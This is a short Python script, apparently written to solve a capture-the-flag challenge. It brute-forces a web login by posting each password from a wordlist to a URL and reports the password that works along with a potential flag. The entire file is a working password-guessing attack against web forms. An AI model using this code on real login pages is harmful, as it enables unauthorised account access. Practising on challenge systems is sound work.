import requests
import sys

chall_request = requests.Session()
chall_url = ''
wordlist = ''

def logar(url, senha, objeto_request):
	chall_post_resposta = objeto_request.post(url, data = {'password':senha})
	chall_post_resposta_source = chall_post_resposta.text

	return(chall_post_resposta_source.split('\n', 1)[0])

def forca_bruta(url, wordlist, objeto_request):
	wordlist = open(wordlist).read().splitlines()
	contador = 0

	for word in wordlist:
		contador = contador + 1
		resposta = logar(url, word, objeto_request)
		if resposta == 'Invalid password!':
			print ("Senha: \"{}\" testada - Contador: {}".format(word, contador))
		else:
			print("Senha encontrada: {}".format(word))
			print("Flag potencial: {}".format(resposta))
			return(word)
			
	print("Senha nao encontrada em wordlist atual!")
	return(None)